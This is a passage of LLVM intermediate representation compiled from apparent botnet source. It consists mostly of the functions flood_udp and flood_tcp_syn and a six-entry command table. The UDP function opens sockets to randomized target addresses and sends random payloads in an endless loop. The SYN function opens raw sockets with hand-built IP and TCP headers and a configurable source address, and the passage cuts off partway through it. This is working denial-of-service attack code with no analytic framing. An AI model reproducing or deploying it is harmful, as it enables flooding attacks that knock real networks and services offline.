  store i8 %5, i8* %9, align 16
  %10 = load i8* (...)*, i8* (...)** %4, align 8
  %11 = load i8, i8* %3, align 1
  %12 = zext i8 %11 to i64
  %13 = getelementptr inbounds [6 x %struct.command], [6 x %struct.command]* @command_list, i64 0, i64 %12
  %14 = getelementptr inbounds %struct.command, %struct.command* %13, i32 0, i32 1
  store i8* (...)* %10, i8* (...)** %14, align 8
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @flood_udp(%struct.arguments*) #0 {
  %2 = alloca %struct.arguments*, align 8
  %3 = alloca i16, align 2
  %4 = alloca i16, align 2
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i32*, align 8
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %11 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.arguments* %0, %struct.arguments** %2, align 8
  store i16 0, i16* %3, align 2
  store i16 0, i16* %4, align 2
  store i32 0, i32* %5, align 4
  %12 = load %struct.arguments*, %struct.arguments** %2, align 8
  %13 = getelementptr inbounds %struct.arguments, %struct.arguments* %12, i32 0, i32 1
  %14 = load %struct.option*, %struct.option** %13, align 8
  %15 = load %struct.arguments*, %struct.arguments** %2, align 8
  %16 = getelementptr inbounds %struct.arguments, %struct.arguments* %15, i32 0, i32 2
  %17 = load i8, i8* %16, align 8
  %18 = call zeroext i16 @retrieve_opt_num(%struct.option* %14, i8 zeroext %17, i8 zeroext 2, i16 zeroext 900)
  store i16 %18, i16* %3, align 2
  %19 = load %struct.arguments*, %struct.arguments** %2, align 8
  %20 = getelementptr inbounds %struct.arguments, %struct.arguments* %19, i32 0, i32 1
  %21 = load %struct.option*, %struct.option** %20, align 8
  %22 = load %struct.arguments*, %struct.arguments** %2, align 8
  %23 = getelementptr inbounds %struct.arguments, %struct.arguments* %22, i32 0, i32 2
  %24 = load i8, i8* %23, align 8
  %25 = call zeroext i16 @retrieve_opt_num(%struct.option* %21, i8 zeroext %24, i8 zeroext 1, i16 zeroext -1)
  store i16 %25, i16* %4, align 2
  %26 = load %struct.arguments*, %struct.arguments** %2, align 8
  %27 = getelementptr inbounds %struct.arguments, %struct.arguments* %26, i32 0, i32 3
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 8) #8
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %6, align 8
  %32 = load i8**, i8*** %6, align 8
  %33 = icmp ne i8** %32, null
  br i1 %33, label %35, label %34

; <label>:34:                                     ; preds = %1
  call void @exit(i32 1) #10
  unreachable

; <label>:35:                                     ; preds = %1
  %36 = load %struct.arguments*, %struct.arguments** %2, align 8
  %37 = getelementptr inbounds %struct.arguments, %struct.arguments* %36, i32 0, i32 3
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i64
  %40 = call noalias i8* @calloc(i64 %39, i64 4) #8
  %41 = bitcast i8* %40 to i32*
  store i32* %41, i32** %7, align 8
  %42 = load i32*, i32** %7, align 8
  %43 = icmp ne i32* %42, null
  br i1 %43, label %45, label %44

; <label>:44:                                     ; preds = %35
  call void @exit(i32 1) #10
  unreachable

; <label>:45:                                     ; preds = %35
  store i32 0, i32* %5, align 4
  br label %46

; <label>:46:                                     ; preds = %171, %45
  %47 = load i32, i32* %5, align 4
  %48 = load %struct.arguments*, %struct.arguments** %2, align 8
  %49 = getelementptr inbounds %struct.arguments, %struct.arguments* %48, i32 0, i32 3
  %50 = load i8, i8* %49, align 1
  %51 = zext i8 %50 to i32
  %52 = icmp slt i32 %47, %51
  br i1 %52, label %53, label %176

; <label>:53:                                     ; preds = %46
  %54 = call i32 @socket(i32 2, i32 2, i32 0) #8
  %55 = load i32*, i32** %7, align 8
  %56 = load i32, i32* %5, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i32, i32* %55, i64 %57
  store i32 %54, i32* %58, align 4
  %59 = load i32*, i32** %7, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i32, i32* %59, i64 %61
  %63 = load i32, i32* %62, align 4
  %64 = icmp eq i32 %63, -1
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %53
  call void @exit(i32 1) #10
  unreachable

; <label>:66:                                     ; preds = %53
  %67 = load i16, i16* %3, align 2
  %68 = zext i16 %67 to i32
  %69 = sub i32 0, 1
  %70 = sub i32 %68, %69
  %71 = add nsw i32 %68, 1
  %72 = sext i32 %70 to i64
  %73 = call noalias i8* @malloc(i64 %72) #8
  %74 = load i8**, i8*** %6, align 8
  %75 = load i32, i32* %5, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds i8*, i8** %74, i64 %76
  store i8* %73, i8** %77, align 8
  %78 = load i8**, i8*** %6, align 8
  %79 = load i32, i32* %5, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8*, i8** %78, i64 %80
  %82 = load i8*, i8** %81, align 8
  %83 = icmp ne i8* %82, null
  br i1 %83, label %85, label %84

; <label>:84:                                     ; preds = %66
  call void @exit(i32 1) #10
  unreachable

; <label>:85:                                     ; preds = %66
  %86 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %86, align 4
  %87 = call i32 @rand_new()
  %88 = trunc i32 %87 to i16
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %88, i16* %89, align 2
  %90 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %91 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %90, i32 0, i32 0
  store i32 0, i32* %91, align 4
  %92 = load i32*, i32** %7, align 8
  %93 = load i32, i32* %5, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  %96 = load i32, i32* %95, align 4
  %97 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %98 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  store %struct.sockaddr* %98, %struct.sockaddr** %97, align 8
  %99 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %100 = load %struct.sockaddr*, %struct.sockaddr** %99, align 8
  %101 = call i32 @bind(i32 %96, %struct.sockaddr* %100, i32 16) #8
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %102, align 4
  %103 = load i16, i16* %4, align 2
  %104 = call zeroext i16 @htons(i16 zeroext %103) #9
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %104, i16* %105, align 2
  %106 = load %struct.arguments*, %struct.arguments** %2, align 8
  %107 = getelementptr inbounds %struct.arguments, %struct.arguments* %106, i32 0, i32 0
  %108 = load %struct.target*, %struct.target** %107, align 8
  %109 = load i32, i32* %5, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds %struct.target, %struct.target* %108, i64 %110
  %112 = getelementptr inbounds %struct.target, %struct.target* %111, i32 0, i32 1
  %113 = load i16, i16* %112, align 4
  %114 = zext i16 %113 to i32
  %115 = icmp slt i32 %114, 32
  br i1 %115, label %116, label %141

; <label>:116:                                    ; preds = %85
  %117 = load %struct.arguments*, %struct.arguments** %2, align 8
  %118 = getelementptr inbounds %struct.arguments, %struct.arguments* %117, i32 0, i32 0
  %119 = load %struct.target*, %struct.target** %118, align 8
  %120 = load i32, i32* %5, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds %struct.target, %struct.target* %119, i64 %121
  %123 = getelementptr inbounds %struct.target, %struct.target* %122, i32 0, i32 0
  %124 = load i32, i32* %123, align 4
  %125 = call i32 @ntohl(i32 %124) #9
  %126 = call i32 @rand_new()
  %127 = load %struct.arguments*, %struct.arguments** %2, align 8
  %128 = getelementptr inbounds %struct.arguments, %struct.arguments* %127, i32 0, i32 0
  %129 = load %struct.target*, %struct.target** %128, align 8
  %130 = load i32, i32* %5, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds %struct.target, %struct.target* %129, i64 %131
  %133 = getelementptr inbounds %struct.target, %struct.target* %132, i32 0, i32 1
  %134 = load i16, i16* %133, align 4
  %135 = zext i16 %134 to i32
  %136 = lshr i32 %126, %135
  %137 = sub i32 0, %136
  %138 = sub i32 %125, %137
  %139 = add i32 %125, %136
  %140 = call i32 @htonl(i32 %138) #9
  br label %150

; <label>:141:                                    ; preds = %85
  %142 = load %struct.arguments*, %struct.arguments** %2, align 8
  %143 = getelementptr inbounds %struct.arguments, %struct.arguments* %142, i32 0, i32 0
  %144 = load %struct.target*, %struct.target** %143, align 8
  %145 = load i32, i32* %5, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.target, %struct.target* %144, i64 %146
  %148 = getelementptr inbounds %struct.target, %struct.target* %147, i32 0, i32 0
  %149 = load i32, i32* %148, align 4
  br label %150

; <label>:150:                                    ; preds = %141, %116
  %151 = phi i32 [ %140, %116 ], [ %149, %141 ]
  %152 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %153 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %152, i32 0, i32 0
  store i32 %151, i32* %153, align 4
  %154 = load i32*, i32** %7, align 8
  %155 = load i32, i32* %5, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds i32, i32* %154, i64 %156
  %158 = load i32, i32* %157, align 4
  %159 = bitcast %union.__CONST_SOCKADDR_ARG* %11 to %struct.sockaddr**
  %160 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %160, %struct.sockaddr** %159, align 8
  %161 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %11, i32 0, i32 0
  %162 = load %struct.sockaddr*, %struct.sockaddr** %161, align 8
  %163 = call i32 @connect(i32 %158, %struct.sockaddr* %162, i32 16)
  %164 = load i8**, i8*** %6, align 8
  %165 = load i32, i32* %5, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds i8*, i8** %164, i64 %166
  %168 = load i8*, i8** %167, align 8
  %169 = load i16, i16* %3, align 2
  %170 = zext i16 %169 to i32
  call void @rand_string(i8* %168, i32 %170)
  br label %171

; <label>:171:                                    ; preds = %150
  %172 = load i32, i32* %5, align 4
  %173 = sub i32 0, 1
  %174 = sub i32 %172, %173
  %175 = add nsw i32 %172, 1
  store i32 %174, i32* %5, align 4
  br label %46

; <label>:176:                                    ; preds = %46
  br label %177

; <label>:177:                                    ; preds = %206, %176
  store i32 0, i32* %5, align 4
  br label %178

; <label>:178:                                    ; preds = %199, %177
  %179 = load i32, i32* %5, align 4
  %180 = load %struct.arguments*, %struct.arguments** %2, align 8
  %181 = getelementptr inbounds %struct.arguments, %struct.arguments* %180, i32 0, i32 3
  %182 = load i8, i8* %181, align 1
  %183 = zext i8 %182 to i32
  %184 = icmp slt i32 %179, %183
  br i1 %184, label %185, label %206

; <label>:185:                                    ; preds = %178
  %186 = load i32*, i32** %7, align 8
  %187 = load i32, i32* %5, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds i32, i32* %186, i64 %188
  %190 = load i32, i32* %189, align 4
  %191 = load i8**, i8*** %6, align 8
  %192 = load i32, i32* %5, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds i8*, i8** %191, i64 %193
  %195 = load i8*, i8** %194, align 8
  %196 = load i16, i16* %3, align 2
  %197 = zext i16 %196 to i64
  %198 = call i64 @send(i32 %190, i8* %195, i64 %197, i32 16384)
  br label %199

; <label>:199:                                    ; preds = %185
  %200 = load i32, i32* %5, align 4
  %201 = sub i32 0, %200
  %202 = sub i32 0, 1
  %203 = add i32 %201, %202
  %204 = sub i32 0, %203
  %205 = add nsw i32 %200, 1
  store i32 %204, i32* %5, align 4
  br label %178

; <label>:206:                                    ; preds = %178
  br label %177
                                                  ; No predecessors!
  ret void
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #2

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #3

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #3

declare i32 @connect(i32, %struct.sockaddr*, i32) #6

declare i64 @send(i32, i8*, i64, i32) #6

; Function Attrs: noinline nounwind uwtable
define void @flood_tcp_syn(%struct.arguments*) #0 {
  %2 = alloca %struct.arguments*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i16, align 2
  %6 = alloca i16, align 2
  %7 = alloca i8, align 1
  %8 = alloca i16, align 2
  %9 = alloca i8**, align 8
  %10 = alloca i8, align 1
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  %13 = alloca i8, align 1
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32*, align 8
  %23 = alloca i32, align 4
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.tcphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca %struct.sockaddr_in, align 4
  %30 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.arguments* %0, %struct.arguments** %2, align 8
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  store i16 0, i16* %5, align 2
  store i16 0, i16* %6, align 2
  store i8 0, i8* %7, align 1
  store i16 0, i16* %8, align 2
  store i8 0, i8* %10, align 1
  store i8 0, i8* %11, align 1
  store i8 0, i8* %12, align 1
  store i8 0, i8* %13, align 1
  store i8 0, i8* %14, align 1
  store i8 0, i8* %15, align 1
  store i8 0, i8* %16, align 1
  store i16 0, i16* %17, align 2
  store i32 0, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  store i32 0, i32* %23, align 4
  %31 = load %struct.arguments*, %struct.arguments** %2, align 8
  %32 = getelementptr inbounds %struct.arguments, %struct.arguments* %31, i32 0, i32 1
  %33 = load %struct.option*, %struct.option** %32, align 8
  %34 = load %struct.arguments*, %struct.arguments** %2, align 8
  %35 = getelementptr inbounds %struct.arguments, %struct.arguments* %34, i32 0, i32 2
  %36 = load i8, i8* %35, align 8
  %37 = call zeroext i16 @retrieve_opt_num(%struct.option* %33, i8 zeroext %36, i8 zeroext 2, i16 zeroext 900)
  store i16 %37, i16* %5, align 2
  %38 = load %struct.arguments*, %struct.arguments** %2, align 8
  %39 = getelementptr inbounds %struct.arguments, %struct.arguments* %38, i32 0, i32 1
  %40 = load %struct.option*, %struct.option** %39, align 8
  %41 = load %struct.arguments*, %struct.arguments** %2, align 8
  %42 = getelementptr inbounds %struct.arguments, %struct.arguments* %41, i32 0, i32 2
  %43 = load i8, i8* %42, align 8
  %44 = call zeroext i16 @retrieve_opt_num(%struct.option* %40, i8 zeroext %43, i8 zeroext 1, i16 zeroext -1)
  store i16 %44, i16* %6, align 2
  %45 = load %struct.arguments*, %struct.arguments** %2, align 8
  %46 = getelementptr inbounds %struct.arguments, %struct.arguments* %45, i32 0, i32 1
  %47 = load %struct.option*, %struct.option** %46, align 8
  %48 = load %struct.arguments*, %struct.arguments** %2, align 8
  %49 = getelementptr inbounds %struct.arguments, %struct.arguments* %48, i32 0, i32 2
  %50 = load i8, i8* %49, align 8
  %51 = call zeroext i16 @retrieve_opt_num(%struct.option* %47, i8 zeroext %50, i8 zeroext 7, i16 zeroext 255)
  %52 = trunc i16 %51 to i8
  store i8 %52, i8* %7, align 1
  %53 = load %struct.arguments*, %struct.arguments** %2, align 8
  %54 = getelementptr inbounds %struct.arguments, %struct.arguments* %53, i32 0, i32 1
  %55 = load %struct.option*, %struct.option** %54, align 8
  %56 = load %struct.arguments*, %struct.arguments** %2, align 8
  %57 = getelementptr inbounds %struct.arguments, %struct.arguments* %56, i32 0, i32 2
  %58 = load i8, i8* %57, align 8
  %59 = call zeroext i16 @retrieve_opt_num(%struct.option* %55, i8 zeroext %58, i8 zeroext 8, i16 zeroext -1)
  store i16 %59, i16* %8, align 2
  %60 = load %struct.arguments*, %struct.arguments** %2, align 8
  %61 = getelementptr inbounds %struct.arguments, %struct.arguments* %60, i32 0, i32 1
  %62 = load %struct.option*, %struct.option** %61, align 8
  %63 = load %struct.arguments*, %struct.arguments** %2, align 8
  %64 = getelementptr inbounds %struct.arguments, %struct.arguments* %63, i32 0, i32 2
  %65 = load i8, i8* %64, align 8
  %66 = call zeroext i16 @retrieve_opt_num(%struct.option* %62, i8 zeroext %65, i8 zeroext 9, i16 zeroext 0)
  %67 = trunc i16 %66 to i8
  store i8 %67, i8* %10, align 1
  %68 = load %struct.arguments*, %struct.arguments** %2, align 8
  %69 = getelementptr inbounds %struct.arguments, %struct.arguments* %68, i32 0, i32 1
  %70 = load %struct.option*, %struct.option** %69, align 8
  %71 = load %struct.arguments*, %struct.arguments** %2, align 8
  %72 = getelementptr inbounds %struct.arguments, %struct.arguments* %71, i32 0, i32 2
  %73 = load i8, i8* %72, align 8
  %74 = call zeroext i16 @retrieve_opt_num(%struct.option* %70, i8 zeroext %73, i8 zeroext 10, i16 zeroext 0)
  %75 = trunc i16 %74 to i8
  store i8 %75, i8* %11, align 1
  %76 = load %struct.arguments*, %struct.arguments** %2, align 8
  %77 = getelementptr inbounds %struct.arguments, %struct.arguments* %76, i32 0, i32 1
  %78 = load %struct.option*, %struct.option** %77, align 8
  %79 = load %struct.arguments*, %struct.arguments** %2, align 8
  %80 = getelementptr inbounds %struct.arguments, %struct.arguments* %79, i32 0, i32 2
  %81 = load i8, i8* %80, align 8
  %82 = call zeroext i16 @retrieve_opt_num(%struct.option* %78, i8 zeroext %81, i8 zeroext 11, i16 zeroext 0)
  %83 = trunc i16 %82 to i8
  store i8 %83, i8* %12, align 1
  %84 = load %struct.arguments*, %struct.arguments** %2, align 8
  %85 = getelementptr inbounds %struct.arguments, %struct.arguments* %84, i32 0, i32 1
  %86 = load %struct.option*, %struct.option** %85, align 8
  %87 = load %struct.arguments*, %struct.arguments** %2, align 8
  %88 = getelementptr inbounds %struct.arguments, %struct.arguments* %87, i32 0, i32 2
  %89 = load i8, i8* %88, align 8
  %90 = call zeroext i16 @retrieve_opt_num(%struct.option* %86, i8 zeroext %89, i8 zeroext 12, i16 zeroext 0)
  %91 = trunc i16 %90 to i8
  store i8 %91, i8* %13, align 1
  %92 = load %struct.arguments*, %struct.arguments** %2, align 8
  %93 = getelementptr inbounds %struct.arguments, %struct.arguments* %92, i32 0, i32 1
  %94 = load %struct.option*, %struct.option** %93, align 8
  %95 = load %struct.arguments*, %struct.arguments** %2, align 8
  %96 = getelementptr inbounds %struct.arguments, %struct.arguments* %95, i32 0, i32 2
  %97 = load i8, i8* %96, align 8
  %98 = call zeroext i16 @retrieve_opt_num(%struct.option* %94, i8 zeroext %97, i8 zeroext 13, i16 zeroext 0)
  %99 = trunc i16 %98 to i8
  store i8 %99, i8* %14, align 1
  %100 = load %struct.arguments*, %struct.arguments** %2, align 8
  %101 = getelementptr inbounds %struct.arguments, %struct.arguments* %100, i32 0, i32 1
  %102 = load %struct.option*, %struct.option** %101, align 8
  %103 = load %struct.arguments*, %struct.arguments** %2, align 8
  %104 = getelementptr inbounds %struct.arguments, %struct.arguments* %103, i32 0, i32 2
  %105 = load i8, i8* %104, align 8
  %106 = call zeroext i16 @retrieve_opt_num(%struct.option* %102, i8 zeroext %105, i8 zeroext 14, i16 zeroext 1)
  %107 = trunc i16 %106 to i8
  store i8 %107, i8* %15, align 1
  %108 = load %struct.arguments*, %struct.arguments** %2, align 8
  %109 = getelementptr inbounds %struct.arguments, %struct.arguments* %108, i32 0, i32 1
  %110 = load %struct.option*, %struct.option** %109, align 8
  %111 = load %struct.arguments*, %struct.arguments** %2, align 8
  %112 = getelementptr inbounds %struct.arguments, %struct.arguments* %111, i32 0, i32 2
  %113 = load i8, i8* %112, align 8
  %114 = call zeroext i16 @retrieve_opt_num(%struct.option* %110, i8 zeroext %113, i8 zeroext 15, i16 zeroext 0)
  %115 = trunc i16 %114 to i8
  store i8 %115, i8* %16, align 1
  %116 = load %struct.arguments*, %struct.arguments** %2, align 8
  %117 = getelementptr inbounds %struct.arguments, %struct.arguments* %116, i32 0, i32 1
  %118 = load %struct.option*, %struct.option** %117, align 8
  %119 = load %struct.arguments*, %struct.arguments** %2, align 8
  %120 = getelementptr inbounds %struct.arguments, %struct.arguments* %119, i32 0, i32 2
  %121 = load i8, i8* %120, align 8
  %122 = call zeroext i16 @retrieve_opt_num(%struct.option* %118, i8 zeroext %121, i8 zeroext 16, i16 zeroext -1)
  store i16 %122, i16* %17, align 2
  %123 = load %struct.arguments*, %struct.arguments** %2, align 8
  %124 = getelementptr inbounds %struct.arguments, %struct.arguments* %123, i32 0, i32 1
  %125 = load %struct.option*, %struct.option** %124, align 8
  %126 = load %struct.arguments*, %struct.arguments** %2, align 8
  %127 = getelementptr inbounds %struct.arguments, %struct.arguments* %126, i32 0, i32 2
  %128 = load i8, i8* %127, align 8
  %129 = call zeroext i16 @retrieve_opt_num(%struct.option* %125, i8 zeroext %128, i8 zeroext 17, i16 zeroext -1)
  %130 = zext i16 %129 to i32
  store i32 %130, i32* %18, align 4
  %131 = load %struct.arguments*, %struct.arguments** %2, align 8
  %132 = getelementptr inbounds %struct.arguments, %struct.arguments* %131, i32 0, i32 1
  %133 = load %struct.option*, %struct.option** %132, align 8
  %134 = load %struct.arguments*, %struct.arguments** %2, align 8
  %135 = getelementptr inbounds %struct.arguments, %struct.arguments* %134, i32 0, i32 2
  %136 = load i8, i8* %135, align 8
  %137 = load i32, i32* @LOCAL_ADDRESS, align 4
  %138 = call i32 @retrieve_opt_ipv4(%struct.option* %133, i8 zeroext %136, i8 zeroext 18, i32 %137)
  store i32 %138, i32* %19, align 4
  %139 = load %struct.arguments*, %struct.arguments** %2, align 8
  %140 = getelementptr inbounds %struct.arguments, %struct.arguments* %139, i32 0, i32 1
  %141 = load %struct.option*, %struct.option** %140, align 8
  %142 = load %struct.arguments*, %struct.arguments** %2, align 8
  %143 = getelementptr inbounds %struct.arguments, %struct.arguments* %142, i32 0, i32 2
  %144 = load i8, i8* %143, align 8
  %145 = call zeroext i16 @retrieve_opt_num(%struct.option* %141, i8 zeroext %144, i8 zeroext 19, i16 zeroext -1)
  %146 = zext i16 %145 to i32
  store i32 %146, i32* %20, align 4
  %147 = load %struct.arguments*, %struct.arguments** %2, align 8
  %148 = getelementptr inbounds %struct.arguments, %struct.arguments* %147, i32 0, i32 1
  %149 = load %struct.option*, %struct.option** %148, align 8
  %150 = load %struct.arguments*, %struct.arguments** %2, align 8
  %151 = getelementptr inbounds %struct.arguments, %struct.arguments* %150, i32 0, i32 2
  %152 = load i8, i8* %151, align 8
  %153 = call i8* @retrieve_opt_str(%struct.option* %149, i8 zeroext %152, i8 zeroext 6, i8* null)
  store i8* %153, i8** %21, align 8
  %154 = load %struct.arguments*, %struct.arguments** %2, align 8
  %155 = getelementptr inbounds %struct.arguments, %struct.arguments* %154, i32 0, i32 1
  %156 = load %struct.option*, %struct.option** %155, align 8
  %157 = load %struct.arguments*, %struct.arguments** %2, align 8
  %158 = getelementptr inbounds %struct.arguments, %struct.arguments* %157, i32 0, i32 2
  %159 = load i8, i8* %158, align 8
  %160 = call i8* @retrieve_opt_str(%struct.option* %156, i8 zeroext %159, i8 zeroext 22, i8* inttoptr (i64 1 to i8*))
  %161 = ptrtoint i8* %160 to i32
  store i32 %161, i32* %23, align 4
  %162 = load %struct.arguments*, %struct.arguments** %2, align 8
  %163 = getelementptr inbounds %struct.arguments, %struct.arguments* %162, i32 0, i32 3
  %164 = load i8, i8* %163, align 1
  %165 = zext i8 %164 to i64
  %166 = call noalias i8* @calloc(i64 %165, i64 8) #8
  %167 = bitcast i8* %166 to i8**
  store i8** %167, i8*** %9, align 8
  %168 = load i8**, i8*** %9, align 8
  %169 = icmp ne i8** %168, null
  br i1 %169, label %171, label %170

; <label>:170:                                    ; preds = %1
  call void @exit(i32 1) #10
  unreachable

; <label>:171:                                    ; preds = %1
  %172 = load %struct.arguments*, %struct.arguments** %2, align 8
  %173 = getelementptr inbounds %struct.arguments, %struct.arguments* %172, i32 0, i32 3
  %174 = load i8, i8* %173, align 1
  %175 = zext i8 %174 to i64
  %176 = call noalias i8* @calloc(i64 %175, i64 4) #8
  %177 = bitcast i8* %176 to i32*
  store i32* %177, i32** %22, align 8
  %178 = load i32*, i32** %22, align 8
  %179 = icmp ne i32* %178, null
  br i1 %179, label %181, label %180

; <label>:180:                                    ; preds = %171
  call void @exit(i32 1) #10
  unreachable

; <label>:181:                                    ; preds = %171
  store i32 0, i32* %3, align 4
  br label %182

; <label>:182:                                    ; preds = %625, %181
  %183 = load i32, i32* %3, align 4
  %184 = load %struct.arguments*, %struct.arguments** %2, align 8
  %185 = getelementptr inbounds %struct.arguments, %struct.arguments* %184, i32 0, i32 3
  %186 = load i8, i8* %185, align 1
  %187 = zext i8 %186 to i32
  %188 = icmp slt i32 %183, %187
  br i1 %188, label %189, label %630

; <label>:189:                                    ; preds = %182
  %190 = call i32 @socket(i32 2, i32 3, i32 6) #8
  %191 = load i32*, i32** %22, align 8
  %192 = load i32, i32* %3, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds i32, i32* %191, i64 %193
  store i32 %190, i32* %194, align 4
  %195 = load i32*, i32** %22, align 8
  %196 = load i32, i32* %3, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds i32, i32* %195, i64 %197
  %199 = load i32, i32* %198, align 4
  %200 = icmp eq i32 %199, -1
  br i1 %200, label %201, label %204

; <label>:201:                                    ; preds = %189
  %202 = load i8**, i8*** %9, align 8
  %203 = bitcast i8** %202 to i8*
  call void @free(i8* %203) #8
  call void @exit(i32 1) #10
  unreachable

; <label>:204:                                    ; preds = %189
  store i32 1, i32* %4, align 4
  %205 = load i32*, i32** %22, align 8
  %206 = load i32, i32* %3, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds i32, i32* %205, i64 %207
  %209 = load i32, i32* %208, align 4
  %210 = bitcast i32* %4 to i8*
  %211 = call i32 @setsockopt(i32 %209, i32 0, i32 3, i8* %210, i32 4) #8
  %212 = icmp eq i32 %211, -1
  br i1 %212, label %213, label %216

; <label>:213:                                    ; preds = %204
  %214 = load i8**, i8*** %9, align 8
  %215 = bitcast i8** %214 to i8*
  call void @free(i8* %215) #8
  call void @exit(i32 1) #10
  unreachable

; <label>:216:                                    ; preds = %204
  %217 = load i32, i32* %23, align 4
  %218 = icmp ne i32 %217, 0
  br i1 %218, label %219, label %238

; <label>:219:                                    ; preds = %216
  %220 = load i16, i16* %6, align 2
  %221 = load i32*, i32** %22, align 8
  %222 = load i32, i32* %3, align 4
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds i32, i32* %221, i64 %223
  %225 = load i32, i32* %224, align 4
  %226 = load %struct.arguments*, %struct.arguments** %2, align 8
  %227 = getelementptr inbounds %struct.arguments, %struct.arguments* %226, i32 0, i32 0
  %228 = load %struct.target*, %struct.target** %227, align 8
  %229 = load i32, i32* %3, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.target, %struct.target* %228, i64 %230
  %232 = getelementptr inbounds %struct.target, %struct.target* %231, i32 0, i32 0
  %233 = load i32, i32* %232, align 4
  %234 = load i32, i32* %19, align 4
  %235 = load i16, i16* %8, align 2
  %236 = zext i16 %235 to i32
  %237 = call i32 @tcp_handshake(i16 zeroext %220, i32 %225, i32 %233, i32 %234, i32 %236)
  br label %238

; <label>:238:                                    ; preds = %219, %216
  %239 = load i16, i16* %5, align 2
  %240 = zext i16 %239 to i32
  %241 = sub i32 0, 110
  %242 = sub i32 %240, %241
  %243 = add nsw i32 %240, 110
  %244 = sext i32 %242 to i64
  %245 = call noalias i8* @malloc(i64 %244) #8
  %246 = load i8**, i8*** %9, align 8
  %247 = load i32, i32* %3, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds i8*, i8** %246, i64 %248
  store i8* %245, i8** %249, align 8
  %250 = load i8**, i8*** %9, align 8
  %251 = load i32, i32* %3, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds i8*, i8** %250, i64 %252
  %254 = load i8*, i8** %253, align 8
  %255 = icmp ne i8* %254, null
  br i1 %255, label %259, label %256

; <label>:256:                                    ; preds = %238
  %257 = load i8**, i8*** %9, align 8
  %258 = bitcast i8** %257 to i8*
  call void @free(i8* %258) #8
  call void @exit(i32 1) #10
  unreachable

; <label>:259:                                    ; preds = %238
  %260 = load i8**, i8*** %9, align 8
  %261 = load i32, i32* %3, align 4
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds i8*, i8** %260, i64 %262
  %264 = load i8*, i8** %263, align 8
  %265 = bitcast i8* %264 to %struct.iphdr*
  store %struct.iphdr* %265, %struct.iphdr** %24, align 8
  %266 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %267 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %266, i64 1
  %268 = bitcast %struct.iphdr* %267 to %struct.tcphdr*
